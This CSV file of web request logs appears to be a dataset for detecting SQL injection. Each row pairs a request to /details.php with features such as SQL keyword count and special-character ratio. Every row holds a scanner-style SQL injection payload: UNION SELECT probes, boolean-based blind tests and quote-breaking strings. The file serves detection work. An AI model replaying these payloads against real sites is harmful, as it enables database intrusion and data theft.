full_url,parsed_url,event_time,hostname,sql_keyword,params_length,request_volume,special_chars,value_to_length
/details.php?prod=-4137%20UNION%20ALL%20SELECT%20CONCAT%280x7176787171%2C0x4f7749534661556e684374724c706c4355644a6f5a44445a44684b4a664c67497455524e4f715749%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=2,"/details.php?prod=-4137 UNION ALL SELECT CONCAT(0x7176787171,0x4f7749534661556e684374724c706c4355644a6f5a44445a44684b4a664c67497455524e4f715749,0x7178706a71),NULL,NULL,NULL,NULL-- -&type=2",1680093085.066845,10.0.2.31,4,164,1.9,1,3.048780487804878
/details.php?prod=-3940%20UNION%20ALL%20SELECT%20CONCAT%280x7176787171%2C%28CASE%20WHEN%20%287430%3D%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%207430%29%20THEN%201%20ELSE%200%20END%29%2C0x7178706a71%29%2CNULL%2CNULL%2CNULL%2CNULL--%20-&type=2,"/details.php?prod=-3940 UNION ALL SELECT CONCAT(0x7176787171,(CASE WHEN (7430=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                7430) THEN 1 ELSE 0 END),0x7178706a71),NULL,NULL,NULL,NULL-- -&type=2",1680093085.085463,10.0.2.31,6,635,1.9,1,1.1023622047244095
/details.php?prod=5&type=6393,/details.php?prod=5&type=6393,1680093125.274132,10.0.2.31,0,5,220.4,0,0.0
/details.php?prod=5&type=2%2C%28%29%28%27%29%2C.%22%2C,"/details.php?prod=5&type=2,()('),."",",1680093125.278063,10.0.2.31,0,13,220.4,2,15.384615384615385
/details.php?prod=5&type=2%27HljAqz%3C%27%22%3EyHOwmz,"/details.php?prod=5&type=2'HljAqz<'"">yHOwmz",1680093125.28192,10.0.2.31,0,21,220.4,2,9.523809523809524
/details.php?prod=5&type=2%29%20AND%208716%3D9109%20AND%20%281552%3D1552,/details.php?prod=5&type=2) AND 8716=9109 AND (1552=1552,1680093125.340744,10.0.2.31,1,32,220.4,0,3.125
/details.php?prod=5&type=2%29%20AND%203472%3D3472%20AND%20%287932%3D7932,/details.php?prod=5&type=2) AND 3472=3472 AND (7932=7932,1680093125.344733,10.0.2.31,1,32,220.4,0,3.125
/details.php?prod=5&type=2%29%29%20AND%205166%3D2352%20AND%20%28%287644%3D7644,/details.php?prod=5&type=2)) AND 5166=2352 AND ((7644=7644,1680093125.348652,10.0.2.31,1,34,220.4,0,2.9411764705882355
/details.php?prod=5&type=2%29%29%20AND%203472%3D3472%20AND%20%28%287331%3D7331,/details.php?prod=5&type=2)) AND 3472=3472 AND ((7331=7331,1680093125.353153,10.0.2.31,1,34,220.4,0,2.9411764705882355
/details.php?prod=5&type=2%20AND%204617%3D5756,/details.php?prod=5&type=2 AND 4617=5756,1680093125.357297,10.0.2.31,1,16,220.4,0,6.25
/details.php?prod=5&type=2%20AND%203472%3D3472,/details.php?prod=5&type=2 AND 3472=3472,1680093125.360217,10.0.2.31,1,16,220.4,0,6.25
/details.php?prod=5&type=2%20AND%206407%3D2358--%20fzKA,/details.php?prod=5&type=2 AND 6407=2358-- fzKA,1680093125.371029,10.0.2.31,1,23,220.4,1,8.695652173913043
/details.php?prod=5&type=2%20AND%203472%3D3472--%20uzEC,/details.php?prod=5&type=2 AND 3472=3472-- uzEC,1680093125.375771,10.0.2.31,1,23,220.4,1,8.695652173913043
/details.php?prod=5&type=2%27%29%20AND%206581%3D1433%20AND%20%28%27LKYQ%27%3D%27LKYQ,/details.php?prod=5&type=2') AND 6581=1433 AND ('LKYQ'='LKYQ,1680093125.389836,10.0.2.31,1,36,220.4,1,5.555555555555555
/details.php?prod=5&type=2%27%29%20AND%203472%3D3472%20AND%20%28%27QZkv%27%3D%27QZkv,/details.php?prod=5&type=2') AND 3472=3472 AND ('QZkv'='QZkv,1680093125.39359,10.0.2.31,1,36,220.4,1,5.555555555555555
/details.php?prod=5&type=2%27%29%29%20AND%209127%3D4603%20AND%20%28%28%27xkiu%27%3D%27xkiu,/details.php?prod=5&type=2')) AND 9127=4603 AND (('xkiu'='xkiu,1680093125.397625,10.0.2.31,1,38,220.4,1,5.2631578947368425
/details.php?prod=5&type=2%27%29%29%20AND%203472%3D3472%20AND%20%28%28%27TlOA%27%3D%27TlOA,/details.php?prod=5&type=2')) AND 3472=3472 AND (('TlOA'='TlOA,1680093125.402732,10.0.2.31,1,38,220.4,1,5.2631578947368425
/details.php?prod=5&type=2%27%20AND%202543%3D5552%20AND%20%27VekL%27%3D%27VekL,/details.php?prod=5&type=2' AND 2543=5552 AND 'VekL'='VekL,1680093125.40682,10.0.2.31,1,34,220.4,1,5.882352941176471
/details.php?prod=5&type=2%27%20AND%203472%3D3472%20AND%20%27MyDi%27%3D%27MyDi,/details.php?prod=5&type=2' AND 3472=3472 AND 'MyDi'='MyDi,1680093125.410789,10.0.2.31,1,34,220.4,1,5.882352941176471
/details.php?prod=5&type=2%27%29%20AND%202508%3D8310%20AND%20%28%27neNd%27%20LIKE%20%27neNd,/details.php?prod=5&type=2') AND 2508=8310 AND ('neNd' LIKE 'neNd,1680093125.415841,10.0.2.31,2,41,220.4,1,7.317073170731708
/details.php?prod=5&type=2%27%29%20AND%203472%3D3472%20AND%20%28%27JVCY%27%20LIKE%20%27JVCY,/details.php?prod=5&type=2') AND 3472=3472 AND ('JVCY' LIKE 'JVCY,1680093125.42012,10.0.2.31,2,41,220.4,1,7.317073170731708
/details.php?prod=5&type=2%25%27%20AND%201185%3D4224%20AND%20%27RYak%25%27%3D%27RYak,/details.php?prod=5&type=2%' AND 1185=4224 AND 'RYak%'='RYak,1680093125.424121,10.0.2.31,1,36,220.4,1,5.555555555555555
/details.php?prod=5&type=2%25%27%20AND%203472%3D3472%20AND%20%27GdvS%25%27%3D%27GdvS,/details.php?prod=5&type=2%' AND 3472=3472 AND 'GdvS%'='GdvS,1680093125.42788,10.0.2.31,1,36,220.4,1,5.555555555555555
/details.php?prod=5&type=2%27%20AND%203160%3D7429%20AND%20%27TPLI%27%20LIKE%20%27TPLI,/details.php?prod=5&type=2' AND 3160=7429 AND 'TPLI' LIKE 'TPLI,1680093125.431019,10.0.2.31,2,39,220.4,1,7.6923076923076925
/details.php?prod=5&type=2%27%20AND%203472%3D3472%20AND%20%27NTNF%27%20LIKE%20%27NTNF,/details.php?prod=5&type=2' AND 3472=3472 AND 'NTNF' LIKE 'NTNF,1680093125.436385,10.0.2.31,2,39,220.4,1,7.6923076923076925
/details.php?prod=5&type=2%22%29%20AND%206374%3D1822%20AND%20%28%22KSaV%22%3D%22KSaV,"/details.php?prod=5&type=2"") AND 6374=1822 AND (""KSaV""=""KSaV",1680093125.439988,10.0.2.31,1,36,220.4,1,5.555555555555555
/details.php?prod=5&type=2%22%29%20AND%203472%3D3472%20AND%20%28%22qNRL%22%3D%22qNRL,"/details.php?prod=5&type=2"") AND 3472=3472 AND (""qNRL""=""qNRL",1680093125.443307,10.0.2.31,1,36,220.4,1,5.555555555555555
/details.php?prod=5&type=2%22%20AND%206571%3D7821%20AND%20%22IFnO%22%3D%22IFnO,"/details.php?prod=5&type=2"" AND 6571=7821 AND ""IFnO""=""IFnO",1680093125.447222,10.0.2.31,1,34,220.4,1,5.882352941176471
/details.php?prod=5&type=2%22%20AND%203472%3D3472%20AND%20%22uNKY%22%3D%22uNKY,"/details.php?prod=5&type=2"" AND 3472=3472 AND ""uNKY""=""uNKY",1680093125.451353,10.0.2.31,1,34,220.4,1,5.882352941176471
